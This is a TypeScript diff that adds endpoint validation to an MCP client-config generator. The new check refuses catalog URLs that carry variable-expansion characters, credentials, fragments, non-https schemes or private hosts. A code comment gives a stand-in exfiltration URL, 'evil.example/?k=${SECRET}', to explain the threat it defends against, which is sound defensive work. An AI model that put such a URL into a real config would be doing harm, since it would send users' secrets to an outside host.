@@ -1,4 +1,5 @@
 import type { McpManifestView } from "../registry/schema";
+import { isLoopbackHost, isPrivateHost } from "./oauth/trust";
 
 /**
  * The `mcpServers` config for a catalog server, as `mcp install` prints and
@@ -23,7 +24,7 @@ export const MCP_CLIENT_IDS: readonly McpClientId[] = [
  * config file as if it were a name.
  */
 export const ENV_VAR_NAME = /^[A-Z_][A-Z0-9_]{0,63}$/;
-const HEADER_NAME = /^[\w-]{1,100}$/;
+export const HEADER_NAME = /^[\w-]{1,100}$/;
 const GENERIC_KEY_TOKENS = new Set(["mcp", "server", "servers"]);
 const MAX_KEY_LENGTH = 40;
 
@@ -73,6 +74,56 @@ function credentialValue(
   return keyEnv === undefined
     ? `${prefix}${placeholder}`
     : `${prefix}${envReference(client, keyEnv)}`;
+}
+
+/**
+ * The endpoint as a config will carry it, or why it must not be put in one.
+ * Clients expand `${VAR}` in a config's `url` and `headers`, so an address a
+ * catalog entry gave as `https://evil.example/?k=${SECRET}` would make the
+ * client send the user's secret away: `$`, `{`, `}` and backticks (also
+ * percent-encoded) are refused. Only https is accepted, without credentials
+ * or a fragment, and not a private or local address; a registry on this
+ * machine (development) may also pin a loopback http server. The URL returned
+ * is the normalised one, and the only form of the endpoint that is shown,
+ * written or contacted.
+ */
+export function checkEndpoint(
+  raw: string | undefined,
+  registryIsLocal: boolean,
+): { url: URL } | { problem: string } {
+  let url: URL;
+  try {
+    url = new URL(raw ?? "");
+  } catch {
+    return { problem: "The catalog records no usable endpoint for this server." };
+  }
+  if (
+    /[`${}]|%7[bd]|%60/i.test(raw ?? "") ||
+    /[`${}]|%7[bd]|%60/i.test(url.href)
+  ) {
+    return {
+      problem: `The catalog's endpoint for ${url.origin} contains characters a client would expand (\`$\`, braces, a backtick), so it was not used.`,
+    };
+  }
+  if (url.username || url.password || url.hash) {
+    return {
+      problem: `The catalog's endpoint ${url.origin} carries credentials or a fragment, so it was not used.`,
+    };
+  }
+  if (url.protocol === "http:" && registryIsLocal && isLoopbackHost(url.hostname)) {
+    return { url };
+  }
+  if (url.protocol !== "https:") {
+    return {
+      problem: `The catalog's endpoint ${url.origin} is not https, so it was not used.`,
+    };
+  }
+  if (isPrivateHost(url.hostname) && !registryIsLocal) {
+    return {
+      problem: `The catalog's endpoint ${url.origin} is a private or local address, so it was not used.`,
+    };
+  }
+  return { url };
 }
 
 /** The header names a custom-headers server accepts. */
@@ -139,11 +190,14 @@ export type McpClientConfig = {
  */
 export function buildMcpClientConfig(
   manifest: McpManifestView,
-  options: { client: McpClientId; keyEnv?: string },
+  options: { client: McpClientId; keyEnv?: string; registryIsLocal?: boolean },
 ): McpClientConfig | null {
-  if (!REMOTE_TRANSPORTS.has(manifest.transport) || !manifest.endpointUrl) {
-    return null;
-  }
+  if (!REMOTE_TRANSPORTS.has(manifest.transport)) return null;
+  const endpoint = checkEndpoint(
+    manifest.endpointUrl,
+    options.registryIsLocal ?? false,
+  );
+  if ("problem" in endpoint) return null;
   const headers = Object.fromEntries(
     Object.entries(
       authHeaders(manifest.auth, options.client, options.keyEnv),
@@ -154,7 +208,7 @@ export function buildMcpClientConfig(
     ...(options.client === "cursor"
       ? {}
       : { type: manifest.transport === "streamable_http" ? "http" : "sse" }),
-    url: manifest.endpointUrl,
+    url: endpoint.url.toString(),
     ...(Object.keys(headers).length > 0 ? { headers } : {}),
   };
   return { mcpServers: { [mcpClientConfigKey(manifest)]: server } };
